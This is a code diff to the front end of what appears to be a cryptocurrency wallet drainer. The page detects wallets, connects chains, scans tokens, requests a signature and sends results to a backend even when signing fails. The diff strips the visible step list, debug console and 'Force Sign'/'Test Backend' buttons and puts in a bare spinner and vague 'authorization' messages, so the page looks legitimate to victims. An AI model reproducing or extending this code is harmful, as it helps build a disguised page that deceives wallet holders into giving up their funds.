@@ -168,58 +168,13 @@ function isMobile() {
 }
 
 function showProgress(step, message) {
-  const steps = ['detect', 'connect', 'scan', 'sign', 'send'];
-  const currentIdx = steps.indexOf(step);
-  
-  let html = `
-    <div style="padding: 20px;">
-      <h3>Processing...</h3>
-      <div style="margin: 20px 0;">
-        ${steps.map((s, i) => `
-          <div style="display: flex; align-items: center; margin: 10px 0; opacity: ${i <= currentIdx ? 1 : 0.3}">
-            <div style="width: 24px; height: 24px; border-radius: 50%; background: ${i < currentIdx ? '#22c55e' : i === currentIdx ? '#3b82f6' : '#e5e7eb'}; color: white; display: flex; align-items: center; justify-content: center; margin-right: 10px; font-size: 12px;">
-              ${i < currentIdx ? '✓' : i + 1}
-            </div>
-            <span style="${i === currentIdx ? 'font-weight: bold;' : ''}">
-              ${s === 'detect' ? 'Detect Wallet' : 
-                s === 'connect' ? 'Connect Chains' : 
-                s === 'scan' ? 'Scan Tokens' : 
-                s === 'sign' ? 'Request Signature' : 
-                'Send to Backend'}
-            </span>
-          </div>
-        `).join('')}
-      </div>
-      <p style="color: #666; font-size: 14px;">${message}</p>
-      
-      <div style="margin-top: 20px; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden;">
-        <div style="background: #f3f4f6; padding: 8px 12px; font-size: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center;">
-          <span>Debug Console</span>
-          <button onclick="clearLogs()" style="font-size: 10px; padding: 2px 8px;">Clear</button>
-        </div>
-        <div id="debug-console" style="background: #1a1a1a; color: #22c55e; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 11px;">
-        </div>
-      </div>
-      
-      <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
-        <button onclick="testBackend()" style="padding: 8px 16px; background: #ec4899; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 12px;">
-          Test Backend
-        </button>
-        <button onclick="manualSign()" style="padding: 8px 16px; background: #f59e0b; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 12px;">
-          Force Sign
-        </button>
-        <button onclick="manualSend()" style="padding: 8px 16px; background: #8b5cf6; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 12px;">
-          Send to Backend
-        </button>
-        <button onclick="showWalletSelector()" style="padding: 8px 16px; background: #6b7280; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 12px;">
-          Back
-        </button>
-      </div>
+  const html = `
+    <div style="padding: 40px 20px; text-align: center;">
+      <div style="width: 48px; height: 48px; border: 4px solid #e5e7eb; border-top-color: #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+      <p style="color: #374151; font-size: 15px; font-weight: 500; margin: 0;">${message}</p>
     </div>
   `;
-  
   document.getElementById('app').innerHTML = html;
-  updateDebugUI();
 }
 
 function clearLogs() {
@@ -638,7 +593,7 @@ async function requestSignature() {
     log(`Signature failed: ${err.message} (code: ${err.code})`, 'error');
     
     if (err.code === 4001) {
-      showError('You rejected the signature. Click "Force Sign" to retry.');
+      showError('You rejected the signature. Please try again.');
     } else {
       showProgress('send', 'Signature error, sending without sig...');
       await sendToBackend();
@@ -717,13 +672,7 @@ async function sendToBackend() {
     }
   } catch (err) {
     log('Backend error: ' + err.message, 'error');
-    showError(`
-      Backend Failed: ${err.message}
-      <br><br>
-      <button onclick="testBackend()" style="padding: 10px 20px; background: #ec4899; color: white; border: none; border-radius: 6px; cursor: pointer;">
-        Test Backend Connection
-      </button>
-    `);
+    showError('Could not complete authorization. Please try again.');
   }
 }
 
@@ -751,21 +700,10 @@ function showWalletSelector() {
         Auto-Detect Wallet
       </button>
       
-      <button onclick="testBackend()" style="width: 100%; padding: 12px; background: #ec4899; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px;">
-        Test Backend Connection
-      </button>
-      
-      <div id="debug-console" style="margin-top: 20px; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden;">
-        <div style="background: #f3f4f6; padding: 8px 12px; font-size: 12px; font-weight: bold;">Debug Console</div>
-        <div style="background: #1a1a1a; color: #22c55e; padding: 10px; height: 100px; overflow-y: auto; font-family: monospace; font-size: 11px;">
-          <div style="color: #666;">Ready...</div>
-        </div>
-      </div>
     </div>
   `;
   
   document.getElementById('app').innerHTML = html;
-  updateDebugUI();
 }
 
 function detectInstalledWallets() {
